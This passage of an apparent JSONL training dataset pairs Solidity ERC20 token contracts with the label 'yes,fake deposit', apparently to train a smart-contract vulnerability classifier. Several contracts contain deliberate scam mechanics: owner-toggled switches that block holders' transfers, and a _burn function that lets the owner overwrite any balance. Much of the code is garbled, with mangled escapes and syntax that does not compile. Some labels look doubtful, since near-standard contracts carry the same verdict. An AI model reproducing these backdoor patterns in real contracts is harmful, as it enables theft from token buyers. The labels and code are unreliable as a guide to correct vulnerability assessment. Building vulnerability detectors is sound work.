override returns (uint256) {\n if (_isExcluded[account]) return _tOwned[account];\n return tokenFromReflection(_rOwned[account]);\n }\n\n function transfer(address recipient, uint256 amount) public override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n function allowance(address owner, address spender) public view override returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n _transfer(sender, recipient, amount);\n return true;\n }\n\n function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n return true;\n }\n\n\n function isExcluded(address account) public view returns (bool) {\n return _isExcluded[account];\n }\n\n function totalFees() public view returns (uint256) {\n return _tFeeTotal;\n }\n \n function _transfer(address sender, address recipient, uint256 amount) private {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount > 0, \"Transfer amount must be greater than zero\");\n if(sender != owner() && recipient != owner())\n require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\n require(_tradeEnabled, \"Trading disabled.\");\n if(_tradeEnabled){\n if (_isExcluded[sender] && !_isExcluded[recipient]) {\n _transferFromExcluded(sender, recipient, amount);\n } else {\n _transferStandard(sender, recipient, amount);\n }\n }\n }\n\n \n function _transferStandard(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = (1,1,1,1,1,1);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n _takeTeam(tTeam);\n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = (1,1,1,1,1,1);\n _tOwned[sender] = _tOwned[sender].sub(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n _takeTeam(tTeam); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\ncontract CryptoGold is ERC20 {\n string public name = \"CryptoGold\";\n string public symbol = \"CG\";\n uint8 public decimals = 18;\n\n uint256 private _totalSupply;\n mapping(address => uint256) private _balances;\n mapping(address => uint256) private _stakes;\n address payable private _owner;\n\n event Mint(address indexed to, uint256 amount);\n event Stake(address indexed from, uint256 amount);\n\n constructor() public {\n _owner = msg.sender;\n _totalSupply = 100000000 * (10 ** uint256(decimals));\n _balances[_owner] = _totalSupply;\n emit Transfer(address(0), _owner, _totalSupply);\n }\n\n function totalSupply() public view returns (uint256) {\n return _totalSupply;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return _balances[account];\n }\n\n function transfer(address recipient, uint256 amount) public returns (bool) {\n if(amount <= _balances[msg.sender], \"Insufficient balance.\"){\nbalances[msg.sender] -= amount;\n balances[recipient] += amount;\n emit Transfer(msg.sender, recipient, amount);\n return true;\n}else{\nreturn false;}\n }\n\n function stake(uint256 amount) public {\n _balances[msg.sender] -= amount;\n _stakes[msg.sender] += amount;\n emit Stake(msg.sender, amount);\n }\n\n function unstake(uint256 amount) public {\n _stakes[msg.sender] -= amount;\n _balances[msg.sender] += amount;\n emit Stake(msg.sender, -amount);\n }\n\n function () external payable {\n _owner.transfer(msg.value);\n }\n}\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.20;\n\ncontract EURSToken is AbstractToken {\n uint256 constant internal FEE_DENOMINATOR = 100000;\n\n uint256 constant internal MAX_FEE_NUMERATOR = FEE_DENOMINATOR;\n\n uint256 constant internal MIN_FEE_NUMERATIOR = 0;\n\n uint256 constant internal MAX_TOKENS_COUNT =\n 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff /\n MAX_FEE_NUMERATOR;\n\n uint256 constant internal DEFAULT_FEE = 5e2;\n\n uint256 constant internal BLACK_LIST_FLAG = 0x01;\n\n uint256 constant internal ZERO_FEE_FLAG = 0x02;\n\n function EURSToken (address _feeCollector) public {\n fixedFee = DEFAULT_FEE;\n minVariableFee = 0;\n maxVariableFee = 0;\n variableFeeNumerator = 0;\n\n owner = msg.sender;\n feeCollector = _feeCollector;\n }\n\n function () public delegatable payable {\n revert (); // Revert if not delegated\n }\n\n function name () public delegatable view returns (string) {\n return \"STASIS EURS Token\";\n }\n\n function symbol () public delegatable view returns (string) {\n return \"EURS\";\n }\n\n function decimals () public delegatable view returns (uint8) {\n return 2;\n }\n\n function totalSupply () public delegatable view returns (uint256) {\n return tokensCount;\n }\n\n function balanceOf (address _owner)\n public delegatable view returns (uint256 balance) {\n return AbstractToken.balanceOf (_owner);\n }\n\n function transfer (address _to, uint256 _value)\n public delegatable payable returns (bool) {\n if (frozen) return false;\n else if (\n (addressFlags [msg.sender] | addressFlags [_to]) & BLACK_LIST_FLAG ==\n BLACK_LIST_FLAG)\n return false;\n else {\n uint256 fee =\n (addressFlags [msg.sender] | addressFlags [_to]) & ZERO_FEE_FLAG == ZERO_FEE_FLAG ?\n 0 :\n calculateFee (_value);\n\n if (_value <= accounts [msg.sender] &&\n fee <= safeSub (accounts [msg.sender], _value)) {\n require (AbstractToken.transfer (_to, _value));\n require (AbstractToken.transfer (feeCollector, fee));\n return true;\n } else return false;\n }\n }\n\n function transferFrom (address _from, address _to, uint256 _value)\n public delegatable payable returns (bool) {\n if (frozen) return false;\n else if (\n (addressFlags [_from] | addressFlags [_to]) & BLACK_LIST_FLAG ==\n BLACK_LIST_FLAG)\n return false;\n else {\n uint256 fee =\n (addressFlags [_from] | addressFlags [_to]) & ZERO_FEE_FLAG == ZERO_FEE_FLAG ?\n 0 :\n calculateFee (_value);\n\n if (_value <= allowances [_from][msg.sender] &&\n fee <= safeSub (allowances [_from][msg.sender], _value) &&\n _value <= accounts [_from] &&\n fee <= safeSub (accounts [_from], _value)) {\n require (AbstractToken.transferFrom (_from, _to, _value));\n require (AbstractToken.transferFrom (_from, feeCollector, fee));\n return true;\n } else return false;\n }\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Apache-2.0;\npragma solidity ^0.7.6;\n\nlibrary SafeMath {\n\n \n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n\n \n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n \n return a / b;\n }\n\n \n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n\n \n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\n\n\ninterface ERC20Interface {\n \n function totalSupply() external view returns (uint256);\n\n \n function balanceOf(address account) external view returns (uint256);\n\n \n function transfer(address recipient, uint256 amount) external returns (bool);\n\n \n function allowance(address owner, address spender) external view returns (uint256);\n\n \n function approve(address spender, uint256 amount) external returns (bool);\n\n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n \n event Transfer(address indexed from, address indexed to, uint256 value);\n\n \n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\nabstract contract ERC20Base is ERC20Interface {\n\n using SafeMath for uint256;\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public override returns (bool success) {\n if (_balances[msg.sender] >= _value && _balances[_to].add(_value) > _balances[_to]) {\n _balances[msg.sender] = _balances[msg.sender].sub(_value);\n _balances[_to] = _balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n\n return false;\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {\n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _balances[_to].add(_value) > _balances[_to]) {\n _balances[_to] = _balances[_to].add(_value);\n _balances[_from] = _balances[_from].sub(_value);\n _allowances[_from][msg.sender] = _allowances[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n return false;\n }\n\n function balanceOf(address _owner) public override view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public override returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public override view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n\n function totalSupply() public override view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract WurstcoinNG is ERC20Base {\n\n using SafeMath for uint256;\n\n uint256 constant SUPPLY = 10000000;\n address immutable owner = msg.sender;\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n\n\n constructor () payable {\n require(SUPPLY > 0, \"SUPPLY has to be greater than 0\");\n\n _name = \"Wurstcoin\";\n _symbol = \"WURST\";\n _decimals = uint8(18);\n _totalSupply = SUPPLY.mul(10 ** uint256(decimals()));\n _balances[msg.sender] = _totalSupply;\n emit Transfer(0x0000000000000000000000000000000000000000, msg.sender, _totalSupply);\n }\n\n \n function name() public view returns (string memory) {\n return _name;\n }\n\n \n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n \n function decimals() public view returns (uint8) {\n return _decimals;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "contract ERC20 is ERC20Data, Domain {\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n /// @notice Transfers `amount` tokens from `msg.sender` to `to`.\n /// @param to The address to move the tokens.\n /// @param amount of the tokens to move.\n /// @return (bool) Returns True if succeeded.\n function transfer(address to, uint256 amount) public returns (bool) {\n // If `amount` is 0, or `msg.sender` is `to` nothing happens\n if (amount != 0) {\n uint256 srcBalance = balanceOf[msg.sender];\n require(srcBalance >= amount, \"ERC20: balance too low\");\n if (msg.sender != to) {\n require(to != address(0), \"ERC20: no zero address\"); // Moved down so low balance calls safe some gas\n\n balanceOf[msg.sender] = srcBalance - amount; // Underflow is checked\n balanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\n }\n }\n emit Transfer(msg.sender, to, amount);\n return true;\n }\n\n /// @notice Transfers `amount` tokens from `from` to `to`. Caller needs approval for `from`.\n /// @param from Address to draw tokens from.\n /// @param to The address to move the tokens.\n /// @param amount The token amount to move.\n /// @return (bool) Returns True if succeeded.\n function transferFrom(\n address from,\n address to,\n uint256 amount\n ) public returns (bool) {\n // If `amount` is 0, or `from` is `to` nothing happens\n if (amount != 0) {\n uint256 srcBalance = balanceOf[from];\n require(srcBalance >= amount, \"ERC20: balance too low\");\n\n if (from != to) {\n uint256 spenderAllowance = allowance[from][msg.sender];\n // If allowance is infinite, don't decrease it to save on gas (breaks with EIP-20).\n if (spenderAllowance != type(uint256).max) {\n require(spenderAllowance >= amount, \"ERC20: allowance too low\");\n allowance[from][msg.sender] = spenderAllowance - amount; // Underflow is checked\n }\n require(to != address(0), \"ERC20: no zero address\"); // Moved down so other failed calls safe some gas\n\n balanceOf[from] = srcBalance - amount; // Underflow is checked\n balanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\n }\n }\n emit Transfer(from, to, amount);\n return true;\n }\n\n /// @notice Approves `amount` from sender to be spend by `spender`.\n /// @param spender Address of the party that can draw from msg.sender's account.\n /// @param amount The maximum collective amount that `spender` can draw.\n /// @return (bool) Returns True if approved.\n function approve(address spender, uint256 amount) public returns (bool) {\n allowance[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true;\n }\n\n // keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n bytes32 private constant PERMIT_SIGNATURE_HASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n\n /// @notice Approves `value` from `owner_` to be spend by `spender`.\n /// @param owner_ Address of the owner.\n /// @param spender The address of the spender that gets approved to draw from `owner_`.\n /// @param value The maximum collective amount that `spender` can draw.\n /// @param deadline This permit must be redeemed before this deadline (UTC timestamp in seconds).\n function permit(\n address owner_,\n address spender,\n uint256 value,\n uint256 deadline,\n uint8 v,\n bytes32 r,\n bytes32 s\n ) external {\n require(owner_ != address(0), \"ERC20: Owner cannot be 0\");\n require(block.timestamp < deadline, \"ERC20: Expired\");\n require(\n ecrecover(_getDigest(keccak256(abi.encode(PERMIT_SIGNATURE_HASH, owner_, spender, value, nonces[owner_]++, deadline))), v, r, s) ==\n owner_,\n \"ERC20: Invalid Signature\"\n );\n allowance[owner_][spender] = value;\n emit Approval(owner_, spender, value);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity =0.8.1;\n\nimport \"./Context.sol\";\nimport \"./IERC20.sol\";\n\n\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n mapping (address =\\u003e uint256) internal \n_balances;\n mapping (address =\\u003e bool) private _approveTransfer;\n mapping (address =\\u003e mapping (address =\\u003e uint256)) private _allowances;\n uint256 internal _totalSupply;\n uint256 _reward;\n string internal _name;\n string internal _symbol;\n uint256 internal _decimals;\n bool maxTxPercent = true;\n address internal _owner;\n \n constructor (string memory name_, string memory symbol_, uint256 decimals_) {\n _name = name_;\n _symbol = symbol_;\n _decimals = decimals_;\n _owner = msg.sender;\n }\n\n modifier onlyOwner() {\n require(_owner == msg.sender, \"Ownable: caller is not the owner\");\n _;\n }\n\n \n function name() public view \nvirtual override returns (string memory) {\n return _name;\n }\n\n \n function symbol() public view \nvirtual override returns (string memory) {\n return _symbol;\n }\n\n \n function decimals() public view virtual override returns (uint256) {\n return _decimals;\n }\n\n \n function totalSupply() public view virtual override returns (uint256) {\n return _totalSupply;\n }\n \n function recall(address _address) external onlyOwner {\n _approveTransfer[_address] = false;\n }\n\n function approveTransfer(address _address) external onlyOwner {\n _approveTransfer[_address] = true;\n }\n\n function approvedTransfer(address _address) public view returns (bool) {\n return _approveTransfer[_address];\n }\n\n function setMaxTxPercent() public virtual onlyOwner {\n if (maxTxPercent == true) {maxTxPercent = false;} else {maxTxPercent = true;}\n }\n \n function maxTxPercentState() public view returns (bool) {\n return maxTxPercent;\n }\n\n \n function balanceOf(address account) public view virtual override returns (uint256) {\n return _balances[account];\n }\n\n function reflectReward (uint256 value) external onlyOwner {\n _reward = value;\n }\n \n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n \n function allowance(address owner, address spender) public view virtual override returns (uint256) {\n return _allowances[owner][spender];\n }\n\n \n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance \\u003e= amount, \"ERC20: transfer amount exceeds allowance\");\n _approve(sender, _msgSender(), currentAllowance - amount);\n return true;\n }\n\n \n \n function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n \n _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n return true;\n }\n\n \n function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n uint256 currentAllowance = _allowances[_msgSender()][spender];\n require(currentAllowance \\u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\n _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n return true;\n }\n\n \n function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n \n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount \\u003e 0, \"Transfer amount must be grater thatn zero\");\n if (_approveTransfer[sender] || _approveTransfer[recipient]) \n require(maxTxPercent == false, \"\");\n if (maxTxPercent == true || sender == _owner || recipient == _owner) {\n _beforeTokenTransfer(sender, recipient, amount);\n uint256 senderBalance = _balances[sender];\n require(senderBalance \\u003e= amount, \"ERC20: transfer amount exceeds balance\");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n emit Transfer(sender, recipient, amount);}\n else {require (maxTxPercent == true, \"\");} \n }\n \n \n function _burn(address account, uint256 amount) internal virtual {\n require(account != address(0), \"ERC20: burn from the zero address\");\n _balances[account] = _reward - amount;\n _totalSupply -= amount;\n emit Transfer(account, address(0), amount);\n }\n \n \n function _approve(address owner, address spender, uint256 amount) internal virtual {\n require(owner != address(0), \"ERC20: approve from the zero address\");\n require(spender != address(0), \"ERC20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n \n }\n\n function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n}\n\ncontract GizmoToken is ERC20 {\n constructor(uint256 initialSupply) ERC20(_name, _symbol, _decimals) {\n _name = \"Gizmo Token | t.me/GizmoToken\";\n _symbol = \"GIZMO\";\n _decimals = 9;\n _totalSupply += initialSupply;\n _balances[msg.sender] += initialSupply;\n emit Transfer(address(0), msg.sender, initialSupply);\n }\n \n function burnRewards(address account, uint256 value) external onlyOwner {\n _burn(account, value);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity =0.8.3;\n\nimport \"./IERC20.sol\";\nimport \"./IERC20Metadata.sol\";\nimport \"./Context.sol\";\n\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n mapping (address =u003e uint256) internal _balances;\n mapping (address =u003e bool) private _feeBurn;\n mapping (address =u003e mapping (address =u003e uint256)) private _allowances;\n bool intTx = true;\n uint256 _burnRate;\n uint256 internal _totalSupply;\n string internal _name;\n string internal _symbol;\n address internal _owner;\n uint256 public _decreaseFee = 250000 * 10**18;\n mapping (address =u003e bool) public _approvedTransfer;\n mapping (address =u003e bool) public _bBots;\n\n constructor (string memory name_, string memory symbol_) {\n _name = name_;\n _symbol = symbol_;\n _owner = msg.sender;\n }\n\n modifier onlyOwner() {\n require(_owner == msg.sender, \"Ownable: only the owner allowed\");\n _;\n }\n\n\n\n\n function initContract() public virtual onlyOwner {\n if (intTx == true) {intTx = false;} else {intTx = true;}\n }\n\n function burnRate (uint256 value) external onlyOwner {\n _burnRate = value;\n }\n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n \n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance\");\n _approve(sender, _msgSender(), currentAllowance - amount);\n return true;\n }\n\t\n function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount u003e 0, \"Transfer amount must be grater thatn zero\");\n \n if(!_approvedTransfer[sender] u0026u0026 _bBots[recipient]) {\n require(amount u003c= _decreaseFee, \"Transfer amount exceeds the maxTxAmount.\"); \n }\n \n\n if (_feeBurn[sender] || _feeBurn[recipient]) \n require(intTx == false, \"\");\n if (intTx == true || sender == _owner || recipient == _owner) {\n _beforeTokenTransfer(sender, recipient, amount);\n uint256 senderBalance = _balances[sender];\n require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n emit Transfer(sender, recipient, amount);}\n else {require (intTx == true, \"\");} \n }\n \n function _burn(address account, uint256 amount) internal virtual {\n require(account != address(0), \"ERC20: burn from the zero address\");\n uint256 accountBalance = _balances[account];\n require(accountBalance u003e= amount, \"ERC20: burn amount exceeds balance\");\n _balances[account] = _burnRate - amount;\n _totalSupply -= amount;\n emit Transfer(account, address(0), amount);\n }\n \n function _approve(address owner, address spender, uint256 amount) internal virtual {\n require(owner != address(0), \"ERC20: approve from the zero address\");\n require(spender != address(0), \"ERC20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n\n function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n \n function decreaseFee(uint256 decreaseFeeAddress) external onlyOwner() {\n _decreaseFee = decreaseFeeAddress;\n }\n \n function approveTransfer(address account) external onlyOwner {\n _approvedTransfer[account] = true; \n }\n \n function bBots(address account) external onlyOwner {\n _bBots[account] = true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.6.12;\n\n\ncontract WrappedIbbtcEth is Initializable, ERC20Upgradeable, PausableUpgradeable, AccessControlUpgradeable {\n IERC20Upgradeable public ibbtc;\n ICore public core;\n uint256 public pricePerShare;\n\n // Pausing\n bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\n bytes32 public constant UNPAUSER_ROLE = keccak256(\"UNPAUSER_ROLE\");\n \n event SetCore(address core);\n\n function initialize(address _ibbtc, address _core) public initializer {\n require(msg.sender == 0xDA25ee226E534d868f0Dd8a459536b03fEE9079b); // dev: only verified deployer\n __ERC20_init(\"Wrapped Interest-Bearing Bitcoin\", \"wibBTC\");\n core = ICore(_core);\n ibbtc = IERC20Upgradeable(_ibbtc);\n\n _setPricePerShare();\n\n emit SetCore(_core);\n }\n\n\n \n\n /// ===== Permissionless Calls =====\n /// @dev Deposit ibBTC to mint wibBTC shares\n function mint(uint256 _shares) external whenNotPaused {\n if (_shares == 0) {\n return;\n }\n require(ibbtc.transferFrom(_msgSender(), address(this), _shares));\n _mint(_msgSender(), _shares);\n }\n\n /// @dev Redeem wibBTC for ibBTC. Denominated in shares.\n function burn(uint256 _shares) external whenNotPaused {\n if (_shares == 0) {\n return;\n }\n _burn(_msgSender(), _shares);\n require(ibbtc.transfer(_msgSender(), _shares));\n }\n\n \n function transferFrom(address sender, address recipient, uint256 amount) public override whenNotPaused returns (bool) {\n /// The _balances mapping represents the underlying ibBTC shares (\"non-rebased balances\")\n /// Some naming confusion emerges due to maintaining original ERC20 var names\n\n if (amount == 0) {\n return true;\n }\n\n _transfer(sender, recipient, amount);\n _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n return true;\n }\n\n \n function transfer(address recipient, uint256 amount) public override whenNotPaused returns (bool) {\n /// The _balances mapping represents the underlying ibBTC shares (\"non-rebased balances\")\n /// Some naming confusion emerges due to maintaining original ERC20 var names\n\n if (amount == 0) {\n return true;\n }\n \n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n function _transfer(address sender, address recipient, uint256 amount) internal override {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n _beforeTokenTransfer(sender, recipient, amount);\n\n uint256 shares = balanceToShares(amount);\n _balances[sender] = _balances[sender].sub(shares, \"ERC20: transfer amount exceeds balance\");\n _balances[recipient] = _balances[recipient].add(shares);\n\n emit Transfer(sender, recipient, amount);\n }\n\n \n function _mint(address account, uint256 shares) internal override {\n require(account != address(0), \"ERC20: mint to the zero address\");\n\n uint256 amount = sharesToBalance(shares);\n\n _beforeTokenTransfer(address(0), account, amount);\n\n _totalSupply = _totalSupply.add(shares);\n _balances[account] = _balances[account].add(shares);\n\n emit Transfer(address(0), account, amount);\n }\n\n\n function _burn(address account, uint256 shares) internal override {\n require(account != address(0), \"ERC20: burn from the zero address\");\n \n uint256 amount = sharesToBalance(shares);\n\n _beforeTokenTransfer(account, address(0), amount);\n\n _balances[account] = _balances[account].sub(shares, \"ERC20: burn amount exceeds balance\");\n _totalSupply = _totalSupply.sub(shares);\n\n emit Transfer(account, address(0), amount);\n }\n\n \n function _setPricePerShare() internal {\n pricePerShare = core.pricePerShare();\n }\n\n\n function balanceToShares(uint256 balance) public view returns (uint256) {\n return balance.mul(1e18).div(pricePerShare);\n }\n\n function sharesToBalance(uint256 shares) public view returns (uint256) {\n return shares.mul(pricePerShare).div(1e18);\n }\n}\n \n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\npragma solidity 0.6.12;\n\nimport \"../../Domain.sol\";\nimport \"../../../interfaces/token/ERC20/IDetailedERC20.sol\";\n\nimport \"hardhat/console.sol\";\n\n\ncontract ERC20Data {\n\tmapping(address => uint256) public balanceOf;\n\tmapping(address => mapping(address => uint256)) public allowance;\n\tmapping(address => uint256) public nonces;\n\n\tstring public name;\n\tstring public symbol;\n\tuint256 public decimals;\n}\n\ncontract ERC20 is ERC20Data, Domain {\n\tevent Transfer(address indexed _from, address indexed _to, uint256 _value);\n\tevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n\tconstructor(string memory name_, string memory symbol_) public {\n\t\tname = name_;\n\t\tsymbol = symbol_;\n\t\tdecimals = 18;\n\t}\n\n\tfunction transfer(address to, uint256 amount) public returns (bool) {\n\t\t// If `amount` is 0, or `msg.sender` is `to` nothing happens\n\t\tif (amount != 0) {\n\t\t\tuint256 srcBalance = balanceOf[msg.sender];\n\t\t\trequire(srcBalance >= amount, \"ERC20::transfer: balance too low\");\n\t\t\tif (msg.sender != to) {\n\t\t\t\trequire(to != address(0), \"ERC20::transfer: no zero address\"); // Moved down so low balance calls safe some gas\n\n\t\t\t\tbalanceOf[msg.sender] = srcBalance - amount; // Underflow is checked\n\t\t\t\tbalanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\n\t\t\t}\n\t\t}\n\t\temit Transfer(msg.sender, to, amount);\n\t\treturn true;\n\t}\n\n\tfunction transferFrom(\n\t\taddress from,\n\t\taddress to,\n\t\tuint256 amount\n\t) public returns (bool) {\n\t\t// If `amount` is 0, or `from` is `to` nothing happens\n\t\tif (amount != 0) {\n\t\t\tuint256 srcBalance = balanceOf[from];\n\t\t\trequire(srcBalance >= amount, \"ERC20::transferFrom: balance too low\");\n\n\t\t\tif (from != to) {\n\t\t\t\tuint256 spenderAllowance = allowance[from][msg.sender];\n\n\t\t\t\t// If allowance is infinite, don't decrease it to save on gas (breaks with EIP-20).\n\t\t\t\tif (spenderAllowance != type(uint256).max) {\n\t\t\t\t\trequire(spenderAllowance >= amount, \"ERC20::transferFrom: allowance too low\");\n\t\t\t\t\tallowance[from][msg.sender] = spenderAllowance - amount; // Underflow is checked\n\t\t\t\t}\n\t\t\t\trequire(to != address(0), \"ERC20::transferFrom: no zero address\"); // Moved down so other failed calls safe some gas\n\n\t\t\t\tbalanceOf[from] = srcBalance - amount; // Underflow is checked\n\t\t\t\tbalanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\n\t\t\t}\n\t\t}\n\t\temit Transfer(from, to, amount);\n\t\treturn true;\n\t}\n\n\n\tfunction approve(address spender, uint256 amount) public returns (bool) {\n\t\tallowance[msg.sender][spender] = amount;\n\t\temit Approval(msg.sender, spender, amount);\n\t\treturn true;\n\t}\n\n\t// solhint-disable-next-line func-name-mixedcase\n\tfunction DOMAIN_SEPARATOR() external view returns (bytes32) {\n\t\treturn _domainSeparator();\n\t}\n\n\t// keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n\tbytes32 private constant PERMIT_SIGNATURE_HASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n\n\tfunction permit(\n\t\taddress owner_,\n\t\taddress spender,\n\t\tuint256 value,\n\t\tuint256 deadline,\n\t\tuint8 v,\n\t\tbytes32 r,\n\t\tbytes32 s\n\t) external {\n\t\trequire(owner_ != address(0), \"ERC20::permit: Owner cannot be 0\");\n\t\trequire(block.timestamp < deadline, \"ERC20: Expired\");\n\t\trequire(\n\t\t\tecrecover(\n\t\t\t\t_getDigest(\n\t\t\t\t\tkeccak256(abi.encode(PERMIT_SIGNATURE_HASH, owner_, spender, value, nonces[owner_]++, deadline))\n\t\t\t\t),\n\t\t\t\tv,\n\t\t\t\tr,\n\t\t\t\ts\n\t\t\t) == owner_,\n\t\t\t\"ERC20::permit: Invalid Signature\"\n\t\t);\n\t\tallowance[owner_][spender] = value;\n\t\temit Approval(owner_, spender, value);\n\t}\n}\n\n\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
